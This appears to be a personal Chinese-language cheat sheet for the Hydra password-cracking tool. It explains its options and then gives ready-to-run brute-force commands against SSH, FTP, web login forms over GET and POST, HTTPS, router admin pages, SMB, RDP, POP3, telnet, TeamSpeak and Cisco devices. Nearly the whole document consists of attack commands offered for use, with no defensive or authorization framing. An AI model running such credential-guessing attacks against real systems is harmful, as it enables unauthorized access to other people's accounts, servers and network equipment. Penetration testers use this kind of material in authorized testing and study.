---
Date: 2024-02-07
tags:
  - 資安
  - 破解
  - 資安工具
---
## 使用方式

```
引數：
-l login 小寫，指定使用者名稱進行破解
-L file 大寫，指定使用者的使用者名稱字典
-p pass 小寫，用於指定密碼破解，很少使用，一般採用密碼字典。
-P file 大寫，用於指定密碼字典。
-e ns 額外的選項，n：空密碼試探，s：使用指定賬戶和密碼試探
-M file 指定目標ip列表檔案，批次破解。
-o file 指定結果輸出檔案
-f 找到第一對登入名或者密碼的時候中止破解。
-t tasks 同時執行的執行緒數，預設是16
-w time 設定最大超時時間，單位
-v / -V 顯示詳細過程
-R 恢復爆破（如果破解中斷了，下次執行 hydra -R /path/to/hydra.restore 就可以繼續任務。）
-x 自定義密碼。
```

```
service：指定服務名，支援的服務跟協定有：telnet，ftp，pop3等等。
注意點：1.自己建立字典,然後放在當前的目錄下或者指定目錄。
2.引數可以統一放在最後，格式比如hydra ip 服務 引數。
3.如果能確定使用者名稱一項時候，比如web登入破解，直接用 -l就可以，然後剩餘時間破解密碼。
4.缺點，如果目標網站登入時候需要驗證碼就無法破解。
5.man hydra最萬能。
6.或者hydra -U http-form等檢視具體幫助。
```

## **開始爆破**

```
hydra -L user.txt -P password.txt -t 2 -vV -e ns 192.168.154.131 ssh
```

[影片](https://youtu.be/FUZsB-nfbnc)

### FTP

檔案傳輸協定

```
hydra -L 使用者名稱字典 -P 密碼字典 -t 6 -e ns IP地址 -v
```

### http協定破解

```
get方式提交，破解web登入：

hydra -L 使用者名稱字典 -P 密碼字典 -t 執行緒 -v -e ns IP地址 http-get /admin/
hydra -L 使用者名稱字典 -P 密碼字典 -t 執行緒 -v -e ns -f IP地址 http-get /admin/index.php

post方式提交，破解web登入：

hydra -f -l 使用者名稱 -P 密碼字典 -V -s 9900 IP地址 http-post-form "/admin/index.php?action=login:user=USER&pw=PASS:"


#/index.php …這個是登入的 url
#後門是POST的資料 其中的使用者名稱密碼使用 USER PASS 來代替
#然後是如果登入出錯 會出現的字元 。。。然後開始破解
```

### https協定破解

```
破解https

hydra -m /index.php -l 使用者名稱 -P 密碼字典.txt IP地址 https
```

### 路由器破解

```
hydra -l admin -x 6:10:1a.~!@#$%^&()-= -t 8 192.168.1.1 http-get /
-l admin 為嘗試破解的使用者名稱。

# -x 6:10:1a. 表示列舉的密碼由 數位、小寫字母和單字元’.'等等組成，長度為 6 - 10 位。-t 8 表示分 8 個並行任務進行爆破嘗試。192.168.1.1 為 Router 地址。http-get 為破解方式（協定）
```

### http-proxy協定破解

```
破解http-proxy：

hydra -l admin -P 字典.txt http-proxy://IP地址
```

### smb破解

```
破解smb：

hydra -l 使用者名稱字典 -P 密碼字典 IP地址 smb
```

### Windows遠端桌面

```
破解rdp(windows遠端登入)：

hydra ip地址 rdp -l administrator -P 密碼字典.txt -V
```

### 郵箱pop3

```
破解郵箱pop3：

hydra -l 使用者名稱 -P 密碼字典.txt my.pop3.mail pop3
```

### telnet破解

```
hydra ip地址 telnet -l 使用者字典.txt -P 密碼字典.txt -t 32 -s 23 -e ns -f -V
```

### 語音通訊工具teamspeak

```
hydra -l 使用者名稱字典 -P 密碼字典.txt -s 埠號 -vV ip teamspeak
```

### cisco

```
hydra -P 密碼字典 IP地址 cisco
hydra -m cloud -P 密碼字典 IP地址 cisco-enable
```